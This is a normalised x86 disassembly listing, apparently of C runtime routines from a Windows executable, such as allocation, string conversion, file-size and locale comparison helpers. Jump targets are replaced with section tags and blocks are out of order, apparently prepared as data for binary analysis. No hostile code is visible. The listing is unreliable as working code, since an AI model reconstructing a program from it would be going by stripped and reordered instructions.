mov eax [ ebp - 0x1c ]
call sub_200db99
retn
xor eax eax
xor eax eax
inc eax
jmp r-xdata
cmp ecx ebx
jne r-xdata
cmp ecx ebx
je r-xdata
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_2023ea2
pop ecx
mov esi eax
cmp esi ebx
je r-xdata
mov [ ecx ] bl
mov [ ebp - 0x1c ] ebx
push esi
call sub_2016140
pop ecx
inc eax
mov [ edi ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax [ ebp + 0x10 ]
jbe r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200a6e1
add esp 0xc
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] 0x22
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
sub_20241bd
push 0x10
push r--data
call sub_200db54
push 0x7
call sub_2010e3c
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
mov [ ebx ] esi
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_200fb13
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
mov [ ebp - 0x1c ] edi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
mov [ eax ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_202429a
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
push [ ebp + 0x10 ]
call sub_2023ea2
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
mov [ ebp - 0x1c ] esi
push eax
call sub_2016140
mov edi eax
inc edi
push 0x1
push edi
call sub_2024e4c
add esp 0xc
mov [ ebx ] eax
cmp eax esi
jne r-xdata
push [ ebp - 0x20 ]
push edi
push eax
call sub_200a6e1
add esp 0xc
cmp eax esi
je r-xdata
call sub_200fb13
mov [ eax ] 0xc
call sub_200fb13
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
mov [ eax ] edi
sub_20242a3
push 0xc
push r--data
call sub_200db54
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_200fb13
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_200db99
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_2011ee9
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_2011ba9
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_202439f
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_2013580
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_20243c1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_200aaac
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_2023a07
pop ecx
mov ebx eax
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_2013580
add esp 0xc
sub_202443c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_200fb13
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_200fb13
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_2024519
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_202443c
pop ebp
retn
sub_2024543
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_202443c
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_2024584
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_200fb13
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_200fb13
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_2020760
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_200fb13
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_202467c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2024584
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_20246b1
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2024584
pop edi
pop ebp
retn
sub_20246d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_2020308
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_200fb13
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_2020308
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_2020308
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2020308
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_202498f
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_200fb13
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_202251a
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_200fb13
mov [ eax ] 0xd
call sub_200fb26
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_200fb26
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_200fb13
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_20135fa
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_202498f
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_2024886
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
push 0x9
pop eax
jmp r-xdata
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
push 0x9
pop esi
mov [ eax ] esi
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
cmp [ ebp + 0x10 ] edi
jg r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
jl r-xdata
call sub_200fb13
push 0x9
pop esi
mov [ eax ] esi
mov [ ebp - 0x1c ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20246d0
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
push 0x16
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
cmp [ ebp + 0xc ] edi
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2024969
mov eax [ ebp - 0x1c ]
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_2024973
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_2024886
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_202498f
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_2024a4b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
push eax
push rw-data
call [ InterlockedExchange@IAT ]
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
push 0x16
pop eax
pop ebp
retn
sub_2024a97
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_2024ad0
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_200fb13
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
call sub_200db99
retn
cmp eax 0x20000
je r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor ebx ebx
call sub_200fb13
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_202498f
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2024bbd
mov eax [ ebp - 0x1c ]
sub_2024c05
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_2024c32
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_2024c4c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_2024c6f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_2024cad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_2025237
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2025279
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2024db5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_201a9e3
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_2025448
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
mov [ ebp - 0x4 ] esi
sub_2024e4c
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20242a3
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_200fb13
test eax eax
je r-xdata
call sub_200fb13
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_2024e8c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_2024ea9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_2024ec7
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_2024ea9
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_2024ea9
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_2022f25
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_2022f6e
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_2009d98
push edi
call sub_2009d98
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_2022f6e
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_2009d98
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_201418b
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_2009eef
pop ecx
test eax eax
je r-xdata
call sub_2023130
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
